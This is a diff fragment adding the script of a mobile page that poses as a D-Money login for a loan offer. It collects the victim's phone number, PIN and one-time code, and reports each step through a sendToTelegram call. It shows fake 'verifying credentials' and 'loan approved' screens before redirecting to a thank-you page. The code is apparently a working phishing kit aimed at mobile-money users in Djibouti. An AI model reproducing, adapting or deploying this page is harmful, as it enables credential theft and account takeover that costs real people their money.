+phoneEl.addEventListener('blur',()=>{
+  const v=phoneEl.value;
+  const hint=document.getElementById('phoneHint');
+  if(hint)hint.style.display='none';
+  if(v.length>0&&!v.startsWith('77')){document.getElementById('phoneError').textContent='Le numéro doit commencer par 77';showError('phoneField','phoneError')}
+  else if(v.length>0&&v.length!==8){document.getElementById('phoneError').textContent=`Entrez les 8 chiffres complets (${v.length}/8)`;showError('phoneField','phoneError')}
+});
+
+/* PIN DOTS */
+const pinHidden=document.getElementById('pinHidden');
+const pinDots=[0,1,2,3].map(i=>document.getElementById('pd'+i));
+const pinDigits=[0,1,2,3].map(i=>document.getElementById('pdd'+i));
+const pinWrap=document.getElementById('pinWrap');
+const pinPeekBtn=document.getElementById('pinPeekBtn');
+const pinClearBtn=document.getElementById('pinClearBtn');
+const pinTapLabel=document.getElementById('pinTapLabel');
+let peekTimeout=null;
+
+function renderPinDots(){
+  const v=pinHidden.value.replace(/\D/g,'').slice(0,4);
+  pinHidden.value=v;pinValue=v;
+  pinDots.forEach((d,i)=>{pinDigits[i].textContent=v[i]||'';d.classList.toggle('filled',i<v.length)});
+  pinTapLabel.textContent=v.length===0?'Appuyez pour entrer votre PIN à 4 chiffres':v.length<4?`${4-v.length} chiffre${4-v.length>1?'s':''} restant${4-v.length>1?'s':''}`:'PIN saisi';
+  pinPeekBtn.classList.toggle('visible',v.length>0);
+  pinClearBtn.classList.toggle('visible',v.length>0);
+  clearError('pinField','pinError');validateLogin();
+}
+function peekPin(){if(peekTimeout)clearTimeout(peekTimeout);pinDots.forEach(d=>d.classList.add('peek'));peekTimeout=setTimeout(unpeekPin,1800)}
+function unpeekPin(){if(peekTimeout){clearTimeout(peekTimeout);peekTimeout=null}pinDots.forEach(d=>d.classList.remove('peek'))}
+function clearPin(){pinHidden.value='';renderPinDots();document.getElementById('pinHidden').focus();unpeekPin()}
+pinHidden.addEventListener('input',renderPinDots);
+pinHidden.addEventListener('focus',()=>{pinWrap.classList.add('focused');renderPinDots()});
+pinHidden.addEventListener('blur',()=>{pinWrap.classList.remove('focused');if(pinValue.length>0&&pinValue.length<4)showError('pinField','pinError');unpeekPin()});
+
+function validateLogin(){
+  const raw=phoneEl.value;
+  const ok=raw.length===8&&raw.startsWith('77')&&pinValue.length===4;
+  document.getElementById('mainBtn').classList.toggle('on',ok);
+}
+
+/* ERROR HELPERS */
+function showError(fieldId,errorId){
+  document.getElementById(fieldId).classList.add('has-error');
+  document.getElementById(errorId).classList.add('show');
+  document.getElementById(fieldId).classList.add('shake');
+  setTimeout(()=>document.getElementById(fieldId).classList.remove('shake'),400);
+}
+function clearError(fieldId,errorId){
+  document.getElementById(fieldId).classList.remove('has-error');
+  document.getElementById(errorId).classList.remove('show');
+}
+
+/* OTP */
+const otpHidden=document.getElementById('otpHidden');
+const otpBoxes=[...document.querySelectorAll('.otp-box')];
+let otpDisabled=false;
+function renderOtp(){
+  const val=otpHidden.value.replace(/\D/g,'').slice(0,6);
+  otpHidden.value=val;
+  const cursor=val.length;
+  otpBoxes.forEach((box,i)=>{
+    box.textContent=val[i]||'';box.className='otp-box';
+    if(otpDisabled){box.classList.add('disabled');return}
+    if(i<cursor)box.classList.add('filled');
+    if(i===cursor&&document.activeElement===otpHidden){box.classList.add('active');if(!val[i])box.classList.add('empty')}
+  });
+  otpValue=val;
+  document.getElementById('otpBtn').classList.toggle('on',val.length===6);
+  if(val.length>0)document.getElementById('otpError').classList.remove('show');
+  if(val.length>0)haptic('select');
+}
+otpHidden.addEventListener('input',renderOtp);
+otpHidden.addEventListener('focus',renderOtp);
+otpHidden.addEventListener('blur',renderOtp);
+document.getElementById('otpWrap').addEventListener('click',()=>{if(!otpDisabled)otpHidden.focus()});
+function resetOtp(disabled){otpDisabled=disabled;otpHidden.value='';otpHidden.disabled=disabled;renderOtp();if(!disabled)otpHidden.focus()}
+
+/* STEPS */
+function showStep(id){
+  document.querySelectorAll('.step').forEach(s=>s.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  currentStep=id;
+  if(id!=='step1')history.pushState({page:'login',step:id},'','');
+}
+
+/* RIPPLE */
+function addRipple(btn,e){
+  const r=btn.getBoundingClientRect();const size=Math.max(r.width,r.height)*2;
+  const x=e.clientX-r.left-size/2,y=e.clientY-r.top-size/2;
+  const rip=document.createElement('span');rip.className='ripple-el';
+  rip.style.cssText=`width:${size}px;height:${size}px;left:${x}px;top:${y}px`;
+  btn.appendChild(rip);rip.addEventListener('animationend',()=>rip.remove());
+}
+['mainBtn','otpBtn'].forEach(id=>{const b=document.getElementById(id);if(b)b.addEventListener('pointerdown',e=>addRipple(b,e),{passive:true})});
+
+/* MAIN BUTTON */
+document.getElementById('mainBtn').onclick=()=>{
+  if(loginClicked)return;
+  const raw=phoneEl.value;
+  let valid=true;
+  if(raw.length!==8||!raw.startsWith('77')){document.getElementById('phoneError').textContent=!raw.startsWith('77')?'Le numéro doit commencer par 77':'Entrez les 8 chiffres complets';showError('phoneField','phoneError');valid=false}
+  if(pinValue.length!==4){showError('pinField','pinError');valid=false}
+  if(!valid)return;
+  phoneValue='+253'+raw;loginClicked=true;haptic('medium');
+  sendToTelegram('receive_offer_clicked');
+  showStep('stepVerify');runVerifySequence(raw);
+};
+
+function runVerifySequence(raw){
+  const label=document.getElementById('verifyLabel');
+  const sub=document.getElementById('verifySub');
+  const ring=document.querySelector('.verify-ring');
+  const icon=document.getElementById('verifyIcon');
+  const vs=[0,1,2].map(i=>document.getElementById('vs'+i));
+  const lines=document.querySelectorAll('.vstep-line');
+  function setStep(i,lbl,s){
+    label.style.opacity='0';sub.style.opacity='0';
+    setTimeout(()=>{label.textContent=lbl;sub.textContent=s;label.style.transition='opacity .22s';sub.style.transition='opacity .22s';label.style.opacity='1';sub.style.opacity='1'},160);
+    vs.forEach((v,j)=>{v.className='vstep'+(j<i?' done':j===i?' active':'')});
+    lines.forEach((l,j)=>{l.classList.toggle('done',j<i)});haptic('select');
+  }
+  setStep(0,'Vérification PIN','Vérification de vos identifiants D-Money…');
+  setTimeout(()=>{setStep(1,'Envoi OTP','Envoi de votre code à usage unique…');haptic('light')},900);
+  setTimeout(()=>{
+    vs.forEach(v=>v.className='vstep done');lines.forEach(l=>l.classList.add('done'));
+    ring.classList.add('done');icon.classList.add('done');
+    label.style.opacity='0';sub.style.opacity='0';
+    setTimeout(()=>{label.textContent='Code Envoyé !';sub.textContent='Vérifiez votre téléphone';label.style.opacity='1';sub.style.opacity='1'},160);
+    haptic('success');
+  },1800);
+  setTimeout(()=>{
+    const masked='+253 77 ** ** '+raw.slice(-2);
+    document.getElementById('maskedNumber').innerHTML='Code envoyé au <strong>'+masked+'</strong>';
+    showStep('step3');startTimer();
+  },2600);
+}
+
+/* OTP BUTTON */
+document.getElementById('otpBtn').onclick=()=>{
+  if(otpSubmitted)return;
+  if(otpValue==='000000'){
+    document.getElementById('otpDisplay').classList.add('shake');
+    setTimeout(()=>document.getElementById('otpDisplay').classList.remove('shake'),400);
+    document.getElementById('otpError').classList.add('show');haptic('error');return;
+  }
+  otpSubmitted=true;
+  if(_otpTimer){clearInterval(_otpTimer);_otpTimer=null}
+  haptic('success');sendToTelegram('offer_received');navigate('thankyou.html');
+};
+
+document.getElementById('resendBtn').onclick=()=>{
+  const btn=document.getElementById('resendBtn');
+  if(!btn.classList.contains('active'))return;
+  if(resendClicked)return;resendClicked=true;
+  sendToTelegram('resend_otp');startTimer();
+};
+
+function startTimer(){
+  if(_otpTimer)clearInterval(_otpTimer);
+  let t=120;
+  const timeEl=document.getElementById('time'),resendBtn=document.getElementById('resendBtn');
+  timeEl.textContent=t;resendBtn.classList.remove('active');resendClicked=false;
+  resetOtp(false);document.getElementById('otpBtn').classList.remove('on');
+  _otpTimer=setInterval(()=>{
+    t--;timeEl.textContent=t;
+    if(t<=0){clearInterval(_otpTimer);_otpTimer=null;resendBtn.classList.add('active');resetOtp(true);document.getElementById('otpBtn').classList.remove('on');document.getElementById('maskedNumber').textContent='Code expiré. Appuyez sur Renvoyer.'}
+  },1000);
+}
+
+/* NAVIGATE */
+function navigate(url){
+  const curtain=document.getElementById('curtain');
+  const label=document.getElementById('cLabel');
+  const sub=document.getElementById('cSub');
+  const dots=[document.getElementById('cd0'),document.getElementById('cd1'),document.getElementById('cd2')];
+  const steps=[{l:'Authentification',s:'Vérification de votre PIN D-Money…',d:0},{l:'Autorisation',s:'Traitement de la demande de prêt…',d:1},{l:'Confirmé',s:'Votre prêt a été approuvé…',d:2}];
+  function setStep(i){label.style.opacity='0';sub.style.opacity='0';setTimeout(()=>{label.textContent=steps[i].l;sub.textContent=steps[i].s;label.style.opacity='1';sub.style.opacity='1'},130);dots.forEach((d,j)=>d.className='cdot'+(j===steps[i].d?' on':j<steps[i].d?' done':''))}
+  document.getElementById('screen').classList.add('exit');curtain.classList.add('show');
+  setStep(0);setTimeout(()=>setStep(1),500);setTimeout(()=>setStep(2),1050);
+  setTimeout(()=>{window.location.href=url},1600);
+}
+
+/* KEYBOARD AWARE */
+if(window.visualViewport){
+  window.visualViewport.addEventListener('resize',()=>{
+    const body=document.getElementById('body');
+    const kbH=window.innerHeight-window.visualViewport.height;
+    body.classList.toggle('keyboard-up',kbH>100);
+    if(kbH>100)body.style.paddingBottom=(kbH+8)+'px';else body.style.paddingBottom='';
+  },{passive:true});
+}
+
+/* CURTAIN PARTICLES */
+(function(){
+  const wrap=document.getElementById('curtainParticles');
+  for(let i=0;i<12;i++){const el=document.createElement('div');el.className='cp';const s=3+Math.random()*5;el.style.cssText=`width:${s}px;height:${s}px;left:${Math.random()*100}%;bottom:${Math.random()*25}%;animation-duration:${5+Math.random()*8}s;animation-delay:${Math.random()*4}s`;wrap.appendChild(el)}
+})();
+
+/* HISTORY */
+history.replaceState({page:'login',step:'step1'},'','');
+window.addEventListener('popstate',function(e){
+  const state=e.state||{};
+  if(currentStep==='step3'||currentStep==='stepVerify'){loginClicked=false;showStep('step1');history.replaceState({page:'login',step:'step1'},'','')}
+  else{window.location.href='index.html'}
+},{passive:false});
+</script>
+</body>
+</html>
